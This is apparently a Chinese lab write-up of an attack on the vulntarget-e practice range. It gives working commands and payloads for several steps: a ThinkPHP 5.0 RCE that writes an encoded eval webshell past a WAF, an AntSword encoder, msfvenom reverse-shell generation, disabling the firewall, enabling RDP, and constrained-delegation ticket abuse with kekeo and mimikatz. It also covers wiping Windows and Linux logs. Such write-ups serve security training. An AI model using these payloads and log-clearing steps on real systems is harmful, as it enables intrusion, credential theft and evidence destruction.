vulntarget-e打靶记录
2022-08-30 00:07:13

记录一次靶机的学习过程，这里使用的是星期五实验室的靶机。

拓扑如下：


1，信息收集

使用nmap进行端口扫描，这个外网靶机开启了防火墙所以用nmap的d参数来绕过防火墙进行扫描端口。

扫描出一个49773端口，存在未知服务。

使用指纹识别工具进行指纹探测探测发现是向日葵的服务，使用今年爆出的远程rce漏洞进行攻击，远程执行查看目录的命令，攻击成功。

主机上线

使用powershell木马进行上线

远程命令执行失败，应该被杀软拦截了。这里可以使用tasklist /svc命令来判断一下是什么杀软（这里省略了）。针对杀软来做出对应的免杀马。

使用命令远程下载免杀木马来进行上线。

上线成功后已经是system权限，可以省去提权这个步骤。

然后进行信息收集，发现存在两张网卡。

使用arp -a 查看arp缓存，发现存在100网段131的主机。这里也可以进行一个网段的主机存活扫描。

查看是否存在域环境，查询后报错，不存在域环境。文件浏览时发现桌面有一个名为需要测试的地址的文本，里面保存着一堆域名。

接下来进行权限维持，这里使用了一个比较简单的写入注册表开启自启动来进行权限维持。

将hashdump下来进行解密，得到的密码是win2008。

横向渗透

端口扫描

131主机扫描，131主机也是存在防火墙，使用了nmap扫描没有扫描成功，这里使用的是kscan工具进行扫描的，这个工具是go写的，个人认为绕过防火墙策略扫描还是很好用的。

发现8888端口存在宝塔面板还存在http服务。

目录扫描

进行目录扫描，没有发现存在有用的文件。

使用cs自带的端口转发功能代理进入100网段。使用代理然后使用浏览器进行访问8888端口，没有正确的路径打不开控制面板。

试着打开80端口，发现返回400状态。

目录爆破也没有爆破出路径。想到之前桌面上的那个域名文件，利用文件进行一个host碰撞，看看有没有发现。

进行host碰撞后发现一个后台登录界面，打开成功后发现是一个登录界面，尝试弱口令登录，没有响应。应该是一个假的登录界面。（host碰撞出来的域名要发host头才能进行一个访问。这里使用的是Modheader的插件工具。）

到这里卡住了，然后继续看回之前那台主机是否存在可利用的。发现桌面有个火狐浏览器，竟然有浏览器的话，试着获取一下浏览器的历史记录看是否有发现。

上传浏览器凭证抓取工具。


将抓取出来的文件进行下载，拷贝到本地。发现没有存在可利用的路径。

然后只能换一种方法来抓取了。将主机上线到msf。使用msf模块进行一个抓取，然后使用sqllite工具进行一个查看（这一个步骤参考了大佬的教程，这里自己抓取的时候没有抓出来，可能是环境的问题，参考了大佬的文章是抓取出来了）

这里没有抓取出来历史记录的路径出来。下面的路径是参考大佬文章抓取出来的路径。

http://192.168.100.131/vulntarget/thinkphp
http://192.168.100.131/vulntarget/pubilc
http://192.168.100.131/vulntarget/pubilc/123
http://192.168.100.131/vulntarget/pubilc/index.php

然后使用路径加上之前host碰撞的后台登录界面成功打开了页面。

发现是Thinkphp5.0的框架，可以使用5.0的rce漏洞进行写webshell。判断一下漏洞能否利用，提交的payload被宝塔拦住了。

应该是system函数被拦截了，测试后发现没有拦截eval函数。用之前学习过的三次URL编码进行加密写webshell进行绕过宝塔waf。（这里使用了大佬的payload）

http://192.168.100.131/vulntarget/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=../../2.php&vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($_REQUEST[cmd]))));?%3E

写入成功后，要使用蚁剑编写编码器的规则来进行一个连接。编码器使用下面的规则进行添加。解码起默认就行了，进行蚁剑连接要添加一个host头。

'use strict';

  // ##########    请在下方编写你自己的代码   ###################
function forceEncode(s) {
  return Array.from(s).map(i=>'%'+i.charCodeAt(0).toString(16).padStart(2,'0')).join('')
}

module.exports = (pwd, data, ext={}) => {
  const payload = data['_']
  data[pwd] = forceEncode(forceEncode(payload));
  delete data['_'];
  console.log(data);
  return data;
}

连接成功后，命令执行发现被禁用了，应该存在disable_function。既然有disable_function可以使用蚁剑插件来绕过disable_function。

蚁剑的插件可以上梯子来下载或者手动安装。尝试绕过disable_function的几种方法都失败了。只能换一种方法，使用绕过disable_function的php马来进行一个命令执行。

https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php

可以在文件目录那里进行编辑把php马写进去然后保存，使用浏览器打开php马就可以看到执行成功命令了。可以看到是ubuntu的系统。

可以执行命令之后就尝试进行上线。然后进行判断目标主机是否出网，可以看到目标主机icmp协议是不出网的。

dig @8.8.8.8 www.baidu.com		#DNS判断出网
curl http://www.baidu.com	# HTTP	判断出网	
curl https://www.baidu.com	# HTTPS	判断出网	
TCP协议可以上传NC工具来判断出网


不出网主机上线，这台主机是Linux系统所以打算使用msf将其上线。（不使用cs是因为Linux上线没成功）。

不出网主机上线msf的话需要进行路由转发。

制作上线用的msf木马。

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.155 LPORT=1110 -f elf > shell155.elf

制作好后需要把木马上传到目标主机，这里使用ladon工具开启一个web服务提供目标主机进行下载。之前使用的是exe版本发现没有开启成功（参考了大佬的教程使用powershell版本的ladon的方法。）然后上传木马文件到web服务的目录下。

这里上线没有成功，试了反向马和正向马均未成功。后面仔细想了一下应该是防火墙拦截了导致未上线成功的原因。然后看了大佬的教程

发现/home 目录下存在key，而且开放了22端口，尝试使用key进行ssh连接。

连接成功后发现是root权限，ssh连接不到一会就断开连接了。应该是做了连接超时限制的。再一次连接上直接关闭防火墙。

ufw disable			#关闭防火墙

ufw status			#查看防火墙状态

关闭防火墙之后，继续尝试上线，进行监听然后可以看到返回会话，成功上线。

拿到shell之后进行简单的信息收集，发现存在两种网卡，存在一个88网段。

权限是一个普通的权限，这里使用了几个比较新的内核漏洞exp进行提权都失败了。

然后又使用了suid和sudo都提权失败。

后面又使用了ssh连接来运行木马，连接成功不到30s就断开了，ssh超时断开应该是30s左右。

既然提权失败就不花时间在上面了，接下来可以使用定时任务来做一个简单的权限维持（这里省略了）。没有root权限拿不到hash值。这里使用了另一种方法，继续使用ssh连接上目标主机copy shadow文件下来，接着使用msf的shell进行文件打包然后下载下来。打开shadow文件可以看到root是禁用的，还有一个vulntarget的用户是存在密码的。接着进行md5哈希破解密码。还有一种思路是在shadow文件里面添加一个root权限的用户，然后覆盖目标主机的shadow文件来达到添加root权限用户的方法。（这里破解花了好长的时间然后就没继续了，没添加root权限用户是因为接下来没root权限也没太大问题所以就没添加）

上传kscan进行扫描，发现88网段存在102主机而且开放1433MSSQL的服务，还开放445端口和135端口。

对1433和445端口进行一个口令爆破。使用msf的爆破模块进行爆破。

通过爆破获取到了一个mssql服务的账号和密码，然后继续用smb的模块继续爆破，通过爆破分别获取到了一个mssql的账号密码和主机账号密码。

MSSQL
test：123.com

administrator:admin@123


使用ew二级代理来连接数据库，这里代理有问题连接失败了，所以用msf的psexec来进行横向攻击。

路由转发添加88网段，设置监听接着启动木马然后返回会话。到这里已经拿下了三台主机的shell了。

域内信息收集

通过查看IP可以发现存在两张网卡，arp查看缓存表发现存在10网段10主机。接着判断是否存在域，可以看到是存在域控的。接下来就是一些域内信息的收集。

msf返回的乱码比较多，这里使用msf的模块来定位域控。发现是刚刚那台主机。

定位到域控之后，尝试爆破一下域内账号。通过爆破获取到了一个普通的域内账号。（正常环境是可以查询出域内的账号的。这里环境问题所以进行爆破。）

账号：win2008
密码：qweASD123

对域控进行端口扫描，就开放了一些通信端口。

约束性委派攻击

使用ADFind工具或者powershell脚本来进行探测win2008是否存在约束委派。使用命令查找约束委派对应的服务

把AdFind，mimikatz，kekeo上传到102主机上面。这里远程开启了3389端口来方便操作

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

AdFind.exe -h 192.168.88.102 -u win2008 -up qweASD123  -b "DC=nami,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto 
使用kekeo进行一个票据的请求
tgt::ask /user:win2008 /domain:vulntarget.com /password:qweASD123 /ticket:ash.kirbi
申请administrator权限的票据
tgs::s4u /tgt:TGT_win2008@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/WIN-1PV25H8UJPN.vulntarget.com
mimikatz注入票据
kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~WIN-1PV25H8UJPN.vulntarget.com@VULNTARGET.COM.kirbi

dir访问
dir \\WIN-1PV25H8UJPN.vulntarget.com\C$



上线10主机，添加一个域用户，然后加入到域管理员中。制作msf马然后进行路由转发10网段进行会话监听，接着把msf马上传到102主机上面（这里尝试上线结果返回的还是102主机的会话，后面我在又试了正向马也没有成功上线，又继续尝试msfpsexec模块进行横向也没成功。在10主机上面测试发现是tcp协议是不出网的，可以尝试使用cs来进行上线）。

到这里已经把四台机器都拿下了。域控可以用黄金票据，SSP注入，DSRM后门等来进行权限维持。

痕迹清理

win机器使用wevtutil进行日志清空。

wevtutil el             列出系统中所有日志名称
wevtutil cl system      清理系统日志
wevtutil cl application 清理应用程序日志
wevtutil cl security    清理安全日志

Linux

在进行Linux机器横向的时候可以使用ssh隐身登录来减少被发现的可能。

清除用户最后一次登录时间：echo > /var/log/lastlog #lastlog命令
清除当前登录用户的信息：echo > /var/log/utmp #使用w,who,users等命令
清除安全日志记录：cat /dev/null > /var/log/secure
清除系统日志记录：cat /dev/null > /var/log/message
